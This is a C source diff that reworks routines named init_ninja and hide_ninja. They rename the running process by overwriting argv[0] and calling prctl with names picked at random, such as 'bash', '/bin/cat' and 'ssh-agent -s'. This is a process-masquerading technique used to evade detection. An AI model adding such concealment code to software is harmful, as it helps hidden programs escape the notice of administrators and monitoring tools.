@@ -21,17 +21,17 @@ struct ninja_data ninja;
 extern char **environ;
 
 void init_ninja(int argc, char **argv){
-printf("init ninja!");
+
     ninja.argv = argv;
     ninja.argc = argc;
     ninja.argv0size = strlen(argv[0]);
-    srand(time(NULL));
+
 }
 
 void hide_ninja(){
     int r;
     const char* title;
-printf("hide ninja!");
+    //printf("hide ninja!");
     r = rand() % 8;
 
     switch(r){
@@ -45,7 +45,7 @@ printf("hide ninja!");
 
     case 2:
         title = "bash";
-        break;
+       break;
 
     case 3:
         title = "/bin/cat";
@@ -67,8 +67,11 @@ printf("hide ninja!");
         title = "ssh-agent -s";
         break;
     }
- //title = "ss";
-    
+
+
+    strncpy(ninja.argv[0],title,ninja.argv0size);
+    prctl(PR_SET_NAME, (unsigned long) title, 0, 0, 0);
+    /*
     static unsigned int size = 0;
     if(!size){
         int env_len = -1;
@@ -96,11 +99,12 @@ printf("hide ninja!");
     
     memset(ninja.argv[0], '\0', size);
     snprintf(ninja.argv[0], size - 1, title, size);
+*/
 
-    prctl(PR_SET_NAME, (unsigned long) title, 0, 0, 0);
    // printf("Udalo sie %s \n", title);
 
 }
+
 /*
 int main(int argc, char **argv)
 {
